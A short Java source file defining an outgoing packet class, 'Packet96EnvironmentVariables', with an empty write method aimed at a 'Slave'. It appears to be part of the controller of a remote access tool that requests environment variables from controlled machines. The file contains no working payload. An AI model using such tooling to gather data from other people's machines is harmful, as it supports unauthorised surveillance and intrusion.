package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet96EnvironmentVariables extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
	
	}

	@Override
	public byte getPacketId() {
		return 96;
	}

}
